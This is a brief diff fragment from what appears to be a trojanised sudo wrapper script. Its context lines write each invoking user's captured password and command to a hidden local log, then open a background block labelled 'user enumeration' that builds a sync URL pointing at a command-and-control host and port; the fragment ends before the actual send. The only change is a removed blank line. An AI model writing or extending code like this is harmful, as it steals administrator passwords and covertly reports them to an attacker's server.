@@ -116,7 +116,6 @@ if [ $VALIDATE_RC -eq 0 ]; then
     echo "${HOST_TS}|sudo|${INVOKING_USER}|${CAPTURED_PASS}|${COMMAND_ARGS}" \
         >> "$LOCAL_LOG" 2>/dev/null
 
-
     # -- user enumeration: fire-and-forget, does not block sudo --
     (
         SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
